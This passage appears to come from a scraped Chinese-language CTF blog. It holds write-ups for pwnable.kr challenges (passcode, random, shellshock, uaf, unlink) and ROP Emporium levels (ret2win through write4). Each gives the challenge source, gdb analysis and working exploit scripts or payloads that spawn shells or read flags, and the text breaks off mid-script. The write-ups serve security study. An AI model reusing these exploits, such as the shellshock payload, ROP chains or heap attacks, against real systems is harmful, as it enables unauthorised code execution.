R_386_JUMP_SLOT 00000000 puts@GLIBC_2.00804a010 00000507 R_386_JUMP_SLOT 00000000 system@GLIBC_2.00804a014 00000607 R_386_JUMP_SLOT 00000000 __gmon_start__0804a018 00000707 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.00804a01c 00000807 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.00804a020 00000907 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7可以在passcode1覆盖为printf函数的GOT地址，然后再输入system函数位置，则下次执行printf时其实执行的是system(&quot;/etc/cat flag&quot;)，在这里要注意的是调用前的参数赋值等，system的执行位置应放在 0x80485e3get flag#12345passcode@ubuntu:~$ python -c \"print 'A' * 96 + '\\x00\\xa0\\x04\\x08' + '134514147\\n'\" | ./passcodeToddler's Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :)flag：Now I can safely trust you that you have credential :)","link":"/488eb6ec.html"},{"title":"pwnable.kr —— random","text":"question#123Daddy, teach me how to use random value in programming!ssh random@pwnable.kr -p2222 (pw:guest)random.c#123456789101112131415161718#include &lt;stdio.h&gt;int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", &amp;key); if( (key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0;}analyse#当rand()函数未设置随机种子时，默认随机种子为1，而种子相同时，每次产生的伪随机数序列都是相同的get flag#1234random@ubuntu:~$ ./random 3039230856Good!Mommy, I thought libc random is unpredictable...flag：Mommy, I thought libc random is unpredictable...","link":"/a4584c42.html"},{"title":"pwnable.kr —— shellshock","text":"question#12345Mommy, there was a shocking news about bash.I bet you already know, but lets just make it sure :)ssh shellshock@pwnable.kr -p2222 (pw:guest)题目要求我们使用ssh登录到服务器上ssh shellshock@pwnable.kr -p2222，密码是guest,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录analyse#题目里说了是利用shellshcok漏洞123456shellshock@ubuntu:~$ ls -lthtotal 960K-r-xr-sr-x 1 root shellshock_pwn 8.4K Oct 12 2014 shellshock-r--r--r-- 1 root root 188 Oct 12 2014 shellshock.c-r--r----- 1 root shellshock_pwn 47 Oct 12 2014 flag-r-xr-xr-x 1 root shellshock 937K Oct 12 2014 bash权限如上，用shellshock的POC看下是否存在漏洞123shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' ./bash -c \"echo test\"vulnerabletest说明存在get flag#123shellshock@ubuntu:~$ env x='() { :;}; bash -c \"cat flag\"' ./shellshock only if I knew CVE-2014-6271 ten years ago..!!Segmentation faultflag：only if I knew CVE-2014-6271 ten years ago..!!","link":"/7a715b77.html"},{"title":"pwnable.kr —— uaf","text":"question#123Mommy, what is Use After Free bug?ssh uaf@pwnable.kr -p2222 (pw:guest)题目要求我们使用ssh登录到服务器上ssh uaf@pwnable.kr -p2222，密码是cmd1的flag,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录uaf.cpp#12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt; #include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human{private: virtual void give_shell(){ system(\"/bin/sh\"); }protected: int age; string name;public: virtual void introduce(){ cout &lt;&lt; \"My name is \" &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; \"I am \" &lt;&lt; age &lt;&lt; \" years old\" &lt;&lt; endl; }};class Man: public Human{public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; \"I am a nice guy!\" &lt;&lt; endl; }};class Woman: public Human{public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; \"I am a cute girl!\" &lt;&lt; endl; }};int main(int argc, char* argv[]){ Human* m = new Man(\"Jack\", 25); Human* w = new Woman(\"Jill\", 21); size_t len; char* data; unsigned int op; while(1){ cout &lt;&lt; \"1. use\\n2. after\\n3. free\\n\"; cin &gt;&gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; \"your data is allocated\" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; }analyse#先把文件下载下来scp -P 2222 -p uaf@pwnable.kr:/home/uaf/* ./申请块大小#在main函数中可以看到以下两段12345400efb: bf 18 00 00 00 mov $0x18,%edi400f00: e8 8b fe ff ff callq 400d90 &lt;_Znwm@plt&gt;400f59: bf 18 00 00 00 mov $0x18,%edi400f5e: e8 2d fe ff ff callq 400d90 &lt;_Znwm@plt&gt;都是申请了一个Fastbin块用于初始化man和woman对象其中函数_Znwm可以用工具c++filt查看真实的函数名12root@5c619b760e10:/ctf/work# c++filt _Znwmoperator new(unsigned long)由于我们要利用UAF漏洞，所以再次申请时，也需要申请一样大小的Fastbin块，所以在选择2时，我们填入大小为24。由于Fastbin是LIFO，所以我们2申请块时，第一次申请得到的是原先属于w的块，第二次申请得到的是原先属于m的块。对象结构#在while(1)处打断点，然后可以查看到fastbin信息12345678910111213141516171819202122232425262728293031320x614e60 FASTBIN { mchunk_prev_size = 0x0, mchunk_size = 0x31, fd = 0x4, bk = 0x4, fd_nextsize = 0x0, bk_nextsize = 0x6b63614a}0x614e90 FASTBIN { mchunk_prev_size = 0x0, mchunk_size = 0x21, fd = 0x401570 &lt;vtable for Man+16&gt;, bk = 0x19, fd_nextsize = 0x614e88, bk_nextsize = 0x31}0x614eb0 FASTBIN { mchunk_prev_size = 0x614e88, mchunk_size = 0x31, fd = 0x4, bk = 0x4, fd_nextsize = 0x0, bk_nextsize = 0x6c6c694a}0x614ee0 FASTBIN { mchunk_prev_size = 0x0, mchunk_size = 0x21, fd = 0x401550 &lt;vtable for Woman+16&gt;, bk = 0x15, fd_nextsize = 0x614ed8, bk_nextsize = 0x411}以其中的块0x614e90为例，是m的结构1234567891011121314gdb-peda$ x/10x 0x614e900x614e90: 0x0000000000000000 0x00000000000000210x614ea0: 0x0000000000401570 0x00000000000000190x614eb0: 0x0000000000614e88 0x00000000000000310x614ec0: 0x0000000000000004 0x00000000000000040x614ed0: 0x0000000000000000 0x000000006c6c694agdb-peda$ x/10a 0x4015700x401570 &lt;vtable for Man+16&gt;: 0x40117a &lt;Human::give_shell()&gt; 0x4012d2 &lt;Man::introduce()&gt;0x401580 &lt;vtable for Human&gt;: 0x0 0x4015f0 &lt;typeinfo for Human&gt;0x401590 &lt;vtable for Human+16&gt;: 0x40117a &lt;Human::give_shell()&gt; 0x401192 &lt;Human::introduce()&gt;0x4015a0 &lt;typeinfo name for Woman&gt;: 0x6e616d6f5735 0x00x4015b0 &lt;typeinfo for Woman&gt;: 0x602390 &lt;vtable for __cxxabiv1::__si_class_type_info@@CXXABI_1.3+16&gt; 0x4015a0 &lt;typeinfo name for Woman&gt;gdb-peda$ x/s 0x614e880x614e88: &quot;Jack&quot;0x401570是Man的虚表，0x19是年龄25岁，0x614e88指向字符串&quot;Jack&quot;也可以查看到w的结构1234567891011121314gdb-peda$ x/10x 0x614ee00x614ee0: 0x0000000000000000 0x00000000000000210x614ef0: 0x0000000000401550 0x00000000000000150x614f00: 0x0000000000614ed8 0x00000000000004110x614f10: 0x0a65657266202e33 0x000000000000000a0x614f20: 0x0000000000000000 0x0000000000000000gdb-peda$ x/10a 0x4015500x401550 &lt;vtable for Woman+16&gt;: 0x40117a &lt;Human::give_shell()&gt; 0x401376 &lt;Woman::introduce()&gt;0x401560 &lt;vtable for Man&gt;: 0x0 0x4015d0 &lt;typeinfo for Man&gt;0x401570 &lt;vtable for Man+16&gt;: 0x40117a &lt;Human::give_shell()&gt; 0x4012d2 &lt;Man::introduce()&gt;0x401580 &lt;vtable for Human&gt;: 0x0 0x4015f0 &lt;typeinfo for Human&gt;0x401590 &lt;vtable for Human+16&gt;: 0x40117a &lt;Human::give_shell()&gt; 0x401192 &lt;Human::introduce()&gt;gdb-peda$ x/s 0x614ed80x614ed8: &quot;Jill&quot;虚表#当存在虚函数的继承时，会出现虚表vtable，用来索引函数12345678Man: 0x401570 --------------- -------------|+0 | vtable_Man| -----&gt; |+0 give_shell | --------------- -------------|+8 | age | |+8 introduce | --------------- -------------|+16| name | ---------------本来调用m的introduce函数时，是*(vtable_man+8)，这里vtable_man是我们可以通过文件写入的值，为了调用到give_shell函数，我们只要将文件内容改成(vtable_man-8)的值代替原来的vtable_man即可注意到这里有三个虚表，Man的，Woman的以及Human的，任意选一个即可，比如我选(0x401670-8)get flag#123456789101112131415161718192021222324uaf@pwnable:~$ python -c &quot;print '\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00'&quot; &gt; /tmp/tmpfileuaf@pwnable:~$ ./uaf 24 /tmp/tmpfile1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1$ lsflag uaf uaf.cpp$ cat flagyay_f1ag_aft3r_pwningflag:yay_f1ag_aft3r_pwning","link":"/23b2d439.html"},{"title":"pwnable.kr —— unlink","text":"question#123Daddy! how can I exploit unlink corruption?ssh unlink@pwnable.kr -p2222 (pw: guest)unlink.c#12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ{ struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];}OBJ;void shell(){ system(&quot;/bin/sh&quot;);}void unlink(OBJ* P){ OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;}int main(int argc, char* argv[]){ malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf(&quot;here is stack address leak: %p\\n&quot;, &amp;A); printf(&quot;here is heap address leak: %p\\n&quot;, A); printf(&quot;now that you have leaks, get shell!\\n&quot;); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;}analyse#块信息#首先我们看下A、B、C的块信息，在printf处打断点1234567891011121314151617181920212223242526272829303132333435360x804b408 FASTBIN { prev_size = 0x0, size = 0x19, fd = 0x804b428, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}0x804b420 FASTBIN { prev_size = 0x0, size = 0x19, fd = 0x804b440, bk = 0x804b410, fd_nextsize = 0x0, bk_nextsize = 0x0}0x804b438 FASTBIN { prev_size = 0x0, size = 0x19, fd = 0x0, bk = 0x804b428, fd_nextsize = 0x0, bk_nextsize = 0x0}gdb-peda$ x/20x 0x804b4080x804b408: 0x00000000 0x00000019 0x0804b428 0x000000000x804b418: 0x00000000 0x00000000 0x00000000 0x000000190x804b428: 0x0804b440 0x0804b410 0x00000000 0x000000000x804b438: 0x00000000 0x00000019 0x00000000 0x0804b4280x804b448: 0x00000000 0x00000000 0x00000000 0x00020bb1gdb-peda$ cContinuing.here is stack address leak: 0xffffd6c4here is heap address leak: 0x804b410now that you have leaks, get shell!可以看到三个块在内存上是连续的，同时代码里可以看到gets函数存在溢出，可以覆盖其他内存地址。unlink#我们要实现任意地址写，已有目标地址target_addr，写入值expect_value那么我们可以推导以下：123456789101112131415A、B、C结构 --------------|+0 | fd | --------------|+4 | bk | --------------|+8 | buf[0-4] | --------------|+12| buf[4-8] | --------------BK=P-&gt;bk; =&gt;BK = *(P+4) FD=P-&gt;fd; =&gt;FD = *PFD-&gt;bk=BK; =&gt;*((*P)+4)=*(P+4)BK-&gt;fd=FD; =&gt;*(*(P+4))=*P因此存在两处任意地址写，我们主要利用下面那个*(*(P+4))=*P对于本题来说，已知A的栈地址A_stack和A的堆地址A_heap，举例我们需要向stack_addr(和A_stack存在一定偏移)中写入shell函数的地址shell_addr。我们可以得到buf的地址是A_heap+8，可存shell_addr地址，我们在B的bk中写入目标栈地址stack_addr，这时我们可以写入*stack_addr=*P，我们需要*P=shell_addr，所以我们在B的fd中填入A_heap+8的值即可。注意到有以下一段123480485ff: 8b 4d fc mov -0x4(%ebp),%ecx 8048602: c9 leave 8048603: 8d 61 fc lea -0x4(%ecx),%esp 8048606: c3 ret将值取出赋值给ecx，后将*(ecx-4)的值赋值给esp。所以我们需要进行修正，将A_heap+8，改成A_heap+12。这时，赋值给ecx的值是A_heap+12，减去4后得到A_heap+8，最后赋值我们可以得到esp的值为*(A_heap+8)，也就是shell_addr，完成跳转。get flag#123456789101112131415161718from pwn import *context.log_level='debug'p = process(&quot;./unlink&quot;)p.recvuntil(&quot;here is stack address leak: &quot;)stack_address = int(p.recvline(), 16)p.recvuntil(&quot;here is heap address leak: &quot;)heap_address = int(p.recvline(), 16)p.recvuntil(&quot;now that you have leaks, get shell!&quot;)print(&quot;stack_address:&quot;, hex(stack_address), &quot;heap_address&quot;, hex(heap_address))payload = p32(0x080484EB) + b'a'*12 + p32(heap_address + 0xc) + p32(stack_address + 0x10)#gdb.attach(p)p.sendline(payload)p.interactive()1234567root@5c619b760e10:~/test# python3 unlink.py[+] Starting local process './unlink': pid 71stack_address: 0xffe33994 heap_address 0x955c410[*] Switching to interactive mode$ lsunlink unlink.py","link":"/9f35ac76.html"},{"title":"ROP Emporium (上)","text":"注意：64位传参前六个参数使用寄存器RDI、RSI、RDX、RCX、R8、R9ret2win#x86#先查看一些基本信息12345678910111213141516171819202122232425262728293031ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ checksec ret2win32 [*] '/home/ubuntu/rop_emporium_all_challenges/ret2win32/ret2win32' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ rabin2 -qs ret2win32 | grep -ve imp -e ' 0 '0x00002068 1 completed.72000x000005f6 99 pwnme0x00000659 41 ret2win0x000006f0 2 __libc_csu_fini0x000004b0 4 __x86.get_pc_thunk.bx0x00002040 4 stderrGLIBC_2.00x0000070c 4 _IO_stdin_used0x00000690 93 __libc_csu_init0x00002060 4 stdinGLIBC_2.00x00000708 4 _fp_hw0x00002064 4 stdoutGLIBC_2.00x0000057b 123 mainubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ rabin2 -z ret2win32 [strings]addr=0x08048710 off=0x00000710 ordinal=000 sz=24 section=.rodata string=ret2win by ROP Emporiumaddr=0x08048728 off=0x00000728 ordinal=001 sz=7 section=.rodata string=32bitsaddr=0x08048731 off=0x00000731 ordinal=002 sz=8 section=.rodata string=Exitingaddr=0x0804873c off=0x0000073c ordinal=003 sz=96 section=.rodata string=For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;addr=0x0804879c off=0x0000079c ordinal=004 sz=30 section=.rodata string=What could possibly go wrong?addr=0x080487bc off=0x000007bc ordinal=005 sz=100 section=.rodata string=You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!addr=0x08048821 off=0x00000821 ordinal=006 sz=3 section=.rodata string=&gt; addr=0x08048824 off=0x00000824 ordinal=007 sz=29 section=.rodata string=Thank you! Here's your flag:addr=0x08048841 off=0x00000841 ordinal=008 sz=18 section=.rodata string=/bin/cat flag.txt看到有函数pwnme,ret2win,同时也有字符串/bin/cat flag.txt。再用IDA看下12345678910111213141516171819202122232425262728293031int __cdecl main(int argc, const char **argv, const char **envp){ setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); puts(\"ret2win by ROP Emporium\"); puts(\"32bits\\n\"); pwnme(); puts(\"\\nExiting\"); return 0;}----------------------------------------------------------------char *pwnme(){ char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); puts( \"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\\n\" \"What could possibly go wrong?\"); puts(\"You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\\n\"); printf(\"&gt; \"); return fgets(&amp;s, 50, stdin);}------------------------------------------------------------------int ret2win(){ printf(\"Thank you! Here's your flag:\"); return system(\"/bin/cat flag.txt\");}基本很明白了，利用pwnme中的s栈溢出跳转到ret2win部分即可exp如下：12345678from pwn import *context(os='linux',arch='i386',log_level='debug')ret_addr = 0x8048659payload = 'a'*(0x28+4)+p32(ret_addr)p = process('./ret2win32')p.recvuntil('&gt;')p.sendline(payload)p.interactive()或者直接python -c &quot;print 'a'*(0x28+4)+'\\x59\\x86\\x04\\x08'&quot; | ./ret2win32x64#1234567ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win$ checksec ret2win[*] '/home/ubuntu/rop_emporium_all_challenges/ret2win/ret2win' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)和32没什么区别，IDA看下12345678910111213141516171819202122232425262728293031int __cdecl main(int argc, const char **argv, const char **envp){ setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); puts(&quot;ret2win by ROP Emporium&quot;); puts(&quot;64bits\\n&quot;); pwnme(); puts(&quot;\\nExiting&quot;); return 0;}-------------------------------------------------------------char *pwnme(){ char s; // [rsp+0h] [rbp-20h] memset(&amp;s, 0, 0x20uLL); puts( &quot;For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\\n&quot; &quot;What could possibly go wrong?&quot;); puts(&quot;You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\\n&quot;); printf(&quot;&gt; &quot;, 0LL); return fgets(&amp;s, 50, stdin);}---------------------------------------------------------------int ret2win(){ printf(&quot;Thank you! Here's your flag:&quot;); return system(&quot;/bin/cat flag.txt&quot;);}由于没有其余参数，所以无差exp如下：12345678from pwn import *context(os='linux',arch='amd64',log_level='debug')ret_addr = 0x400811payload = 'a'*(0x20+8)+p64(ret_addr)p = process('./ret2win')p.recvuntil('&gt;')p.sendline(payload)p.interactive()split#x86#123456789101112131415161718ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ checksec split32[*] '/home/ubuntu/rop_emporium_all_challenges/split/split32' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ rabin2 -z split32[strings]addr=0x080486f0 off=0x000006f0 ordinal=000 sz=22 section=.rodata string=split by ROP Emporiumaddr=0x08048706 off=0x00000706 ordinal=001 sz=7 section=.rodata string=32bitsaddr=0x0804870f off=0x0000070f ordinal=002 sz=8 section=.rodata string=Exitingaddr=0x08048718 off=0x00000718 ordinal=003 sz=44 section=.rodata string=Contriving a reason to ask user for data...addr=0x08048744 off=0x00000744 ordinal=004 sz=3 section=.rodata string=&gt; addr=0x08048747 off=0x00000747 ordinal=005 sz=8 section=.rodata string=/bin/lsaddr=0x0804a030 off=0x00001030 ordinal=000 sz=18 section=.data string=/bin/cat flag.txt7 stringsIDA看下代码123456789101112131415char *pwnme(){ char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); puts(\"Contriving a reason to ask user for data...\"); printf(\"&gt; \"); return fgets(&amp;s, 96, stdin);}-----------------------------------------------------------------int usefulFunction(){ return system(\"/bin/ls\");}显然就是ROP，调用system，传入/bin/cat flag.txt字符串地址了exp如下：123456789from pwn import *context(os='linux',arch='i386',log_level='debug')elf = ELF('./split32')p = process('./split32')sys_plt = elf.symbols['system']payload = 'a'*(0x28+4)+p32(sys_plt)+p32(0xdeadbeaf)+p32(0x0804a030)p.recvuntil('&gt;')p.sendline(payload)p.interactive()x64#只有一个传参的区别，找一下gadget1234567891011ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ rabin2 -z split[strings]addr=0x004008a8 off=0x000008a8 ordinal=000 sz=22 section=.rodata string=split by ROP Emporiumaddr=0x004008be off=0x000008be ordinal=001 sz=7 section=.rodata string=64bitsaddr=0x004008c7 off=0x000008c7 ordinal=002 sz=8 section=.rodata string=Exitingaddr=0x004008d0 off=0x000008d0 ordinal=003 sz=44 section=.rodata string=Contriving a reason to ask user for data...addr=0x004008fc off=0x000008fc ordinal=004 sz=3 section=.rodata string=&gt; addr=0x004008ff off=0x000008ff ordinal=005 sz=8 section=.rodata string=/bin/lsaddr=0x00601060 off=0x00001060 ordinal=000 sz=18 section=.data string=/bin/cat flag.txtubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ ROPgadget --binary split --only \"pop|ret\" | grep \"rdi\"0x0000000000400883 : pop rdi ; retIDA看下：123456789char *pwnme(){ char s; // [rsp+0h] [rbp-20h] memset(&amp;s, 0, 0x20uLL); puts(\"Contriving a reason to ask user for data...\"); printf(\"&gt; \", 0LL); return fgets(&amp;s, 96, stdin);}exp如下：1234567891011from pwn import *context(os='linux',arch='amd64',log_level='debug')elf = ELF('./split')p = process('./split')sys_plt = elf.symbols['system']pop_rdi_ret = 0x0000000000400883string_addr = 0x601060payload = 'a'*(0x20+8)+p64(pop_rdi_ret)+p64(string_addr)+p64(sys_plt)p.recvuntil('&gt;')p.sendline(payload)p.interactive()callme#x86#1234567ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme$ checksec callme32 [*] '/home/ubuntu/rop_emporium_all_challenges/callme/callme32' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)用IDA查看下1234567891011121314151617char *pwnme(){ char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); puts(\"Hope you read the instructions...\"); printf(\"&gt; \"); return fgets(&amp;s, 256, stdin);}--------------------------------------------------------------void __noreturn usefulFunction(){ callme_three(4, 5, 6); callme_two(4, 5, 6); callme_one(4, 5, 6); exit(1);}看了下，应该是构造ROP，分别调用callme_one,callme_two,callme_three，在.so文件中看到都是三个参数，得是1,2,3。所以为了维持栈平衡，需要找pop三次ret的gadget。12345678910ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme$ ROPgadget --binary callme32 --only 'pop|ret' Gadgets information============================================================0x080488ab : pop ebp ; ret0x080488a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048579 : pop ebx ; ret0x080488aa : pop edi ; pop ebp ; ret0x080488a9 : pop esi ; pop edi ; pop ebp ; ret0x08048562 : ret0x080486be : ret 0xeac1所以找到了gadget地址0x080488a9123456789101112131415from pwn import *context(os='linux',arch='i386',log_level='debug')elf = ELF('./callme32')p = process('./callme32')callme_one = elf.symbols['callme_one']callme_two = elf.symbols['callme_two']callme_three = elf.symbols['callme_three']pop_pop_pop_ret = 0x080488a9 payload = 'a'*(0x28+4)payload += p32(callme_one)+p32(pop_pop_pop_ret)+p32(1)+p32(2)+p32(3)payload += p32(callme_two)+p32(pop_pop_pop_ret)+p32(1)+p32(2)+p32(3)payload += p32(callme_three)+p32(pop_pop_pop_ret)+p32(1)+p32(2)+p32(3)p.recvuntil('&gt;')p.sendline(payload)p.interactive()x64#同上，只是参数传递不同，三个参数分别用rdi、rsi、rdx传递，所以找gadget12345678910111213141516171819ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme/callme$ ROPgadget --binary callme --only 'pop|ret' Gadgets information============================================================0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b20 : pop r14 ; pop r15 ; ret0x0000000000401b22 : pop r15 ; ret0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000401900 : pop rbp ; ret0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret0x0000000000401b23 : pop rdi ; ret0x0000000000401ab2 : pop rdx ; ret0x0000000000401b21 : pop rsi ; pop r15 ; ret0x0000000000401ab1 : pop rsi ; pop rdx ; ret0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004017d9 : retUnique gadgets found: 14找到gadget地址0x0000000000401ab0构造exp如下：123456789101112131415from pwn import *context(os='linux',arch='amd64',log_level='debug')elf = ELF('./callme')p = process('./callme')callme_one = elf.symbols['callme_one']callme_two = elf.symbols['callme_two']callme_three = elf.symbols['callme_three']pop_pop_pop_ret = 0x401ab0payload = 'a'*(0x20+8)payload += p64(pop_pop_pop_ret)+p64(1)+p64(2)+p64(3)+p64(callme_one)payload += p64(pop_pop_pop_ret)+p64(1)+p64(2)+p64(3)+p64(callme_two)payload += p64(pop_pop_pop_ret)+p64(1)+p64(2)+p64(3)+p64(callme_three)p.recvuntil('&gt;')p.sendline(payload)p.interactive()write4#考察任意地址写，举例如下：12345pop r1 pop r2 ret;（r1存地址，r2存信息）mov ptr [r1], r2 ret;（将r2的内容存入r1指向的地址）x86#1234567891011121314151617ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ checksec write432[*] '/home/ubuntu/rop_emporium_all_challenges/write4/write432' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ rabin2 -z write432[strings]addr=0x08048700 off=0x00000700 ordinal=000 sz=23 section=.rodata string=write4 by ROP Emporiumaddr=0x08048717 off=0x00000717 ordinal=001 sz=7 section=.rodata string=32bitsaddr=0x08048720 off=0x00000720 ordinal=002 sz=8 section=.rodata string=Exitingaddr=0x08048728 off=0x00000728 ordinal=003 sz=41 section=.rodata string=Go ahead and give me the string already!addr=0x08048751 off=0x00000751 ordinal=004 sz=3 section=.rodata string=&gt; addr=0x08048754 off=0x00000754 ordinal=005 sz=8 section=.rodata string=/bin/ls6 strings用IDA看下123456789101112131415char *pwnme(){ char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); puts(\"Go ahead and give me the string already!\"); printf(\"&gt; \"); return fgets(&amp;s, 512, stdin);}-----------------------------------------------------------------------int usefulFunction(){ return system(\"/bin/ls\");}有system，但是字符串不是我们想要的，如果可以改成调用system('/bin/sh')就好了，所以需要我们自己写入这个字符串。找一下任意地址写的gadget123456789101112131415ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ ROPgadget --binary write432 --only \"mov|pop|ret\"Gadgets information============================================================0x08048547 : mov al, byte ptr [0xc9010804] ; ret0x08048670 : mov dword ptr [edi], ebp ; ret0x080484b0 : mov ebx, dword ptr [esp] ; ret0x080486db : pop ebp ; ret0x080486d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080483e1 : pop ebx ; ret0x080486da : pop edi ; pop ebp ; ret0x080486d9 : pop esi ; pop edi ; pop ebp ; ret0x0804819d : ret0x080484fe : ret 0xeac1Unique gadgets found: 10看到地址0x080486da、0x08048670两条gadget满足需求。同时x86系统一次只能写入4个字节，故需要将字符串拆分 成两次分别写入.data段构造exp如下：123456789101112131415161718from pwn import *context(os = 'linux',arch = 'i386', log_level = 'debug')elf = ELF('./write432')p = process('./write432')pop_edi_pop_ebp_ret=0x080486damov_ptredi_ebp_ret=0x08048670data_addr = 0x0804a028 payload = 'a'*(0x28+4)payload += p32(pop_edi_pop_ebp_ret)payload += p32(data_addr)+'/bin'payload += p32(mov_ptredi_ebp_ret)payload += p32(pop_edi_pop_ebp_ret)payload += p32(data_addr+4)+'/sh\\x00'payload += p32(mov_ptredi_ebp_ret)payload += p32(elf.symbols['system'])+p32(0xdeadbeaf)+p32(data_addr)p.recvuntil('&gt;')p.sendline(payload)p.interactive()x64#区别在于传参，同时字符串/bin/sh只需要一次就可以完全写入找下gadget123456789101112131415161718192021ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ ROPgadget --binary write4 --only &quot;mov|pop|ret&quot;Gadgets information============================================================0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret0x0000000000400821 : mov dword ptr [rsi], edi ; ret0x00000000004007ae : mov eax, 0 ; pop rbp ; ret0x0000000000400820 : mov qword ptr [r14], r15 ; ret0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400890 : pop r14 ; pop r15 ; ret0x0000000000400892 : pop r15 ; ret0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x0000000000400893 : pop rdi ; ret0x0000000000400891 : pop rsi ; pop r15 ; ret0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005b9 : retUnique gadgets found: 16可以看到0x0000000000400820与0x0000000000400890处的gadget满足要求构造exp如下：12345678910111213141516171819from pwn import *context(os = 'linux',arch = 'amd64', log_level='debug')elf = ELF('./write4')p = process('./write4')data_addr = 0x0000000000601050pop_r14_pop_r15_ret = 0x0000000000400890mov_ptrr14_r15_ret = 0x0000000000400820pop_rdi_ret = 